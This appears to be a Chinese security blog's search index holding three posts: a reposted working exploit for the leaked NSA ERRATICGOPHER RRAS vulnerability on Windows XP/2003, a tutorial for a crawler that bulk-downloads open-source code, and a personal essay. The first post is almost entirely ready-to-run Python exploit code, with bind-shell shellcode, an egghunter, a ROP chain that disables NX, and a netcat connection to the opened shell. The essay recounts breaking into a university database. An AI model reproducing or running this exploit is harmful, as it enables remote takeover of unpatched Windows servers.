<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>远程溢出之古怪地鼠ERRATICGOPHER</title>
      <link href="/2018/08/02/exploit-erraticgopher/"/>
      <url>/2018/08/02/exploit-erraticgopher/</url>
      <content type="html"><![CDATA[<p>ERRATICGOPHER是NSA泄露的针对<code>RRAS（Routing and Remote Access Service）</code>服务的攻击程序，影响<code>Windows XP</code> <code>Windows 2003</code>，此漏洞在<code>Vista</code>发布之前已经被修复。</p><p>附<code>EXPLOIT</code>，来自<a href="https://github.com/offensive-security/exploit-database/blob/d304cc3d3ef22bd6e5bccdeb6c13720345bbfc0c/exploits/windows/remote/41929.py" target="_blank" rel="noopener">exploit-db</a></p><blockquote><p>需要安装<code>impacket</code>模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from threading import Thread    </span><br><span class="line">                                </span><br><span class="line">from impacket import smb</span><br><span class="line">from impacket import uuid</span><br><span class="line">from impacket import dcerpc</span><br><span class="line">from impacket.dcerpc.v5 import transport</span><br><span class="line">                </span><br><span class="line">target = sys.argv[1]</span><br><span class="line"></span><br><span class="line">print &apos;[-]Initiating connection&apos;</span><br><span class="line">trans = transport.DCERPCTransportFactory(&apos;ncacn_np:%s[\\pipe\\browser]&apos; % target)</span><br><span class="line">trans.connect()</span><br><span class="line"></span><br><span class="line">print &apos;[-]connected to ncacn_np:%s[\\pipe\\browser]&apos; % target</span><br><span class="line">dce = trans.DCERPC_class(trans)</span><br><span class="line">#RRAS DCE-RPC CALL</span><br><span class="line">dce.bind(uuid.uuidtup_to_bin((&apos;8f09f000-b7ed-11ce-bbd2-00001a181cad&apos;, &apos;0.0&apos;)))</span><br><span class="line"></span><br><span class="line">egghunter = &quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a&quot;</span><br><span class="line">egghunter += &quot;\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;</span><br><span class="line"></span><br><span class="line">#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=4444 -b &quot;\x00&quot; -f python</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xb8\x3c\xb1\x1e\x1d\xd9\xc8\xd9\x74\x24\xf4\x5a\x33&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x53\x83\xc2\x04\x31\x42\x0e\x03\x7e\xbf\xfc&quot;</span><br><span class="line">buf += &quot;\xe8\x82\x57\x82\x13\x7a\xa8\xe3\x9a\x9f\x99\x23\xf8&quot;</span><br><span class="line">buf += &quot;\xd4\x8a\x93\x8a\xb8\x26\x5f\xde\x28\xbc\x2d\xf7\x5f&quot;</span><br><span class="line">buf += &quot;\x75\x9b\x21\x6e\x86\xb0\x12\xf1\x04\xcb\x46\xd1\x35&quot;</span><br><span class="line">buf += &quot;\x04\x9b\x10\x71\x79\x56\x40\x2a\xf5\xc5\x74\x5f\x43&quot;</span><br><span class="line">buf += &quot;\xd6\xff\x13\x45\x5e\x1c\xe3\x64\x4f\xb3\x7f\x3f\x4f&quot;</span><br><span class="line">buf += &quot;\x32\x53\x4b\xc6\x2c\xb0\x76\x90\xc7\x02\x0c\x23\x01&quot;</span><br><span class="line">buf += &quot;\x5b\xed\x88\x6c\x53\x1c\xd0\xa9\x54\xff\xa7\xc3\xa6&quot;</span><br><span class="line">buf += &quot;\x82\xbf\x10\xd4\x58\x35\x82\x7e\x2a\xed\x6e\x7e\xff&quot;</span><br><span class="line">buf += &quot;\x68\xe5\x8c\xb4\xff\xa1\x90\x4b\xd3\xda\xad\xc0\xd2&quot;</span><br><span class="line">buf += &quot;\x0c\x24\x92\xf0\x88\x6c\x40\x98\x89\xc8\x27\xa5\xc9&quot;</span><br><span class="line">buf += &quot;\xb2\x98\x03\x82\x5f\xcc\x39\xc9\x37\x21\x70\xf1\xc7&quot;</span><br><span class="line">buf += &quot;\x2d\x03\x82\xf5\xf2\xbf\x0c\xb6\x7b\x66\xcb\xb9\x51&quot;</span><br><span class="line">buf += &quot;\xde\x43\x44\x5a\x1f\x4a\x83\x0e\x4f\xe4\x22\x2f\x04&quot;</span><br><span class="line">buf += &quot;\xf4\xcb\xfa\xb1\xfc\x6a\x55\xa4\x01\xcc\x05\x68\xa9&quot;</span><br><span class="line">buf += &quot;\xa5\x4f\x67\x96\xd6\x6f\xad\xbf\x7f\x92\x4e\xae\x23&quot;</span><br><span class="line">buf += &quot;\x1b\xa8\xba\xcb\x4d\x62\x52\x2e\xaa\xbb\xc5\x51\x98&quot;</span><br><span class="line">buf += &quot;\x93\x61\x19\xca\x24\x8e\x9a\xd8\x02\x18\x11\x0f\x97&quot;</span><br><span class="line">buf += &quot;\x39\x26\x1a\xbf\x2e\xb1\xd0\x2e\x1d\x23\xe4\x7a\xf5&quot;</span><br><span class="line">buf += &quot;\xc0\x77\xe1\x05\x8e\x6b\xbe\x52\xc7\x5a\xb7\x36\xf5&quot;</span><br><span class="line">buf += &quot;\xc5\x61\x24\x04\x93\x4a\xec\xd3\x60\x54\xed\x96\xdd&quot;</span><br><span class="line">buf += &quot;\x72\xfd\x6e\xdd\x3e\xa9\x3e\x88\xe8\x07\xf9\x62\x5b&quot;</span><br><span class="line">buf += &quot;\xf1\x53\xd8\x35\x95\x22\x12\x86\xe3\x2a\x7f\x70\x0b&quot;</span><br><span class="line">buf += &quot;\x9a\xd6\xc5\x34\x13\xbf\xc1\x4d\x49\x5f\x2d\x84\xc9&quot;</span><br><span class="line">buf += &quot;\x6f\x64\x84\x78\xf8\x21\x5d\x39\x65\xd2\x88\x7e\x90&quot;</span><br><span class="line">buf += &quot;\x51\x38\xff\x67\x49\x49\xfa\x2c\xcd\xa2\x76\x3c\xb8&quot;</span><br><span class="line">buf += &quot;\xc4\x25\x3d\xe9&quot;</span><br><span class="line"></span><br><span class="line">#NX disable routine for Windows Server 2003 SP2</span><br><span class="line">rop = &quot;\x30\xdb\xc0\x71&quot; #push esp, pop ebp, retn ws_32.dll</span><br><span class="line">rop += &quot;\x45&quot;*16</span><br><span class="line">rop += &quot;\xe9\x77\xc1\x77&quot; #push esp, pop ebp, retn 4 gdi32.dll</span><br><span class="line">rop += &quot;\x5d\x7a\x81\x7c&quot; #ret 20</span><br><span class="line">rop += &quot;\x71\x42\x38\x77&quot; #jmp esp</span><br><span class="line">rop += &quot;\xf6\xe7\xbd\x77&quot; #add esp,2c ; retn msvcrt.dll</span><br><span class="line">rop += &quot;\x90&quot;*2 + egghunter + &quot;\x90&quot;*42</span><br><span class="line">rop += &quot;\x17\xf5\x83\x7c&quot; #Disable NX routine</span><br><span class="line">rop += &quot;\x90&quot;*4</span><br><span class="line"></span><br><span class="line">stub = &quot;\x21\x00\x00\x00\x10\x27\x00\x00\x30\x07\x00\x00\x00\x40\x51\x06\x04\x00\x00\x00\x00\x85\x57\x01\x30\x07\x00\x00\x08\x00\x00\x00&quot; #Magic bytes</span><br><span class="line">stub += &quot;\x41&quot;*20 + rop + &quot;\xCC&quot;*100 + &quot;w00tw00t&quot; + buf + &quot;\x42&quot;*(1313-20-len(rop)-100-8-len(buf))</span><br><span class="line">stub += &quot;\x12&quot; #Magic byte</span><br><span class="line">stub += &quot;\x46&quot;*522</span><br><span class="line">stub += &quot;\x04\x00\x00\x00\x00\x00\x00\x00&quot; #Magic bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dce.call(0x1d, stub)   #0x1d MIBEntryGet (vulnerable function)</span><br><span class="line">print &quot;[-]Exploit sent to target successfully...&quot;</span><br><span class="line"></span><br><span class="line">print &quot;Waiting for shell...&quot;</span><br><span class="line">time.sleep(5)</span><br><span class="line">os.system(&quot;nc &quot; + target + &quot; 4444&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> EXPLOIT </tag>
            
            <tag> SMB </tag>
            
            <tag> 远程溢出 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫之批量下载Admin5源码</title>
      <link href="/2018/08/01/crawl-admin5/"/>
      <url>/2018/08/01/crawl-admin5/</url>
      <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> 提供了各种语言的开源项目，包括<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>等。最近开始玩代码审计，到处找项目很麻烦，所以打算写一个爬虫，借助Admin5批量下载各类开源项目。</p><h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>首先，分析下<code>Admin5</code>的页面。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-1.png" alt="截图-1"></p><p>可以看到，页面数据直接在html中显示的，并不是JS渲染上去的，这就比较好爬了。在响应的请求中，页面用的是<code>gb2312</code>编码，打印的时候需要注意一下，不然会乱码。建议设置编码为<code>gbk</code>，因为<code>gb2312</code>的支持的字没有<code>gbk</code>多，像打印<code>囧</code>的时候，就会抛异常。</p><p>首页的地址是<code>http://down.admin5.com/php/</code>，往后翻页，再看看首页的地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-2.png" alt="截图-2"></p><p>变成了<code>http://down.admin5.com/php/list_30_1.html</code>。</p><p>那么就可以得出页面的地址规则 <code>php/list_30_页码.html</code>。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-3.png" alt="截图-3"></p><p>这里使用<code>XPATH表达式</code>可以很方便的获取页面数据，<code>//div[@class=&quot;lists_bigimg_right&quot;]/a</code>，获取当前页所有项目详情的 <code>a</code> 标签，即详情页的地址。</p><p>随便进入一个项目的详情，找到下载地址。</p><p><img src="/2018/08/01/crawl-admin5/screenshot-4.png" alt="截图-4"></p><p>使用 XPATH : <code>//ul[@class=&quot;down-anniu&quot;]//li/a/@href</code>，获取下载地址，这条XPATH是获取所有的下载点地址，实际用不到这么多，可以修改下 <code>//ul[@class=&quot;down-anniu&quot;]/li[1]/a/@href</code>，只获取1条。</p><p>当然，这个页面还包含了其它的数据，同样可以用 XPATH 采集，就不详细写了，后面在代码中会有。</p><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>下面梳理下我们爬虫的运行流程。</p><ol><li><p>访问<code>http://down.admin5.com/php/</code>，<code>asp</code>,<code>.net</code>等语言项目的页面其实是一样的，改下路径就行，这里以<code>php</code>的为例。</p></li><li><p>获取后续页面的地址，即下一页。由于<code>Admin5</code>的页面比较简单，可以直接获取总页数，然后用<code>for</code>循环，遍历<code>http://down.admin5.com/php/list_30_页码.html</code>。</p></li><li><p>获取每个项目的详细页地址，并跟进。</p></li><li><p>提取项目的详细参数，获取下载地址，加入下载队列。</p></li><li><p>下载模块不断取出队列的任务，下载项目，直到队列为空。</p></li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>这个项目比较简单，所以没有用<code>scrapy</code>等很重的框架去做。就用最简单的<code>requests</code>库去实现，下面设计一下具体的业务模型。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><ol><li>ProjectItem<ul><li>name</li><li>size</li><li>update_date</li><li>official_url</li><li>download_url</li></ul></li></ol><p>这个模型包含每个项目的属性，包括项目名称，大小，更新日期，官方地址，下载地址。</p><ol start="2"><li>Downloader<ul><li>download_queue</li><li>cache_path</li><li>save_path</li><li>add_task(projcet_item)</li><li>print_progress()</li><li>save_cache()</li></ul></li></ol><p>下载器，这个模型负责下载项目，维护下载队列，监控下载进度，并对下载过的项目地址做缓存，防止重复下载。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>已上传到 <a href="https://github.com/CHN-Jaylin/Spider/tree/master/admin5" target="_blank" rel="noopener">Github</a>， 具体实现请查看代码，注释已经写的比较清楚了。</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="/2018/08/01/crawl-admin5/screenshot-5.png" alt="截图-5"></p><p>已经实现了自动保存下载进度，可以随时<code>Ctrl+C</code>退出程序，下次执行时会跳过已下载的项目。</p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>昨天，明天</title>
      <link href="/2018/07/31/yesterday-and-tomorrow/"/>
      <url>/2018/07/31/yesterday-and-tomorrow/</url>
      <content type="html"><![CDATA[<p>在二零一八年七月的尾巴，写下这篇文章。算是对过去的一个回忆总结，还有未来的计划。</p><p>做安全，是我高中时候就有的想法。那个时候WooYun还在，我还记得曾经挖到一个小厂的任意用户密码重置的漏洞，注册了第一个账号，踏上了我在安全路上的第一步。</p><p>高中的时候住校，手机查的还严。每天最开心的就是窝在被子里，翻着WooYun，逛逛Zone。看看今天谁家Struts2的洞还没补，哪个厂的裤子又被脱了。当然，还有各路大佬分享的奇技淫巧，一哥猪猪侠，画漫画的小川……</p><p>大学，我来到离家1500KM的成都，因为各种原因，选了一个不喜欢的专业，加了学生会，每天都让自己很忙，常常是通宵在工作，也没有时间再去关注安全圈。第一个学期的学期末，重要的几门专业基础课还是都不懂。我意识到这个专业真的不适合我，即使毕业了，我也不会去做这行。某个晚上，我扯出路由器上的网线，连上学校内网，拿下了支撑学校核心业务的数据库。表里，挂掉的两科静静的躺在那，只要我敲下键盘，就是全班最佳。思考了许久，还是关掉了终端。理智战胜了贪欲，假的永远不会真，做了假，就要每天担心谎言会在哪天被拆穿。</p><p>第二个学期，不顾家人反对，我转到了软件专业，学习软件开发。环境原因，班上的计算机水平都不行，凭着高中攒下的知识，吊打全专业。不过这没什么好比的，格局要大。我开始参加各种比赛，移动开发，大数据，软件杯。一路过来，经历了很多，承担了很多，收获了很多，可以说是我人生成长最多的历程。在这里，我迷失过，特别是我深入开发之后，我发现IT的方向原来这么多，我对每个方向都感兴趣，但一个人不可能把每条路走通，必须找一条合适自己路。开发这条路，我走了很久，也做过自己引以为傲的作品。不过我不喜欢做业务，像是搬砖一样的堆砌代码，写没有灵魂的程序，所以，是时候回去了。</p><p>这一年，最开心的事莫过于通过升本考试，接下来的两年，我将在CUIT继续学习。CUIT最出名的，就是信息安全了吧，也是牛人云集的地方。希望多年以后，再看这篇文章的时候，我也是一枚大佬了。</p><p>不忘初心，方得始终。</p>]]></content>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 心路 </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
    <entry>
      <title>timeline</title>
      <link href="/timeline/index.html"/>
      <url>/timeline/index.html</url>
      <content type="html"><![CDATA[]]></content>
    </entry>
    
  
</search>
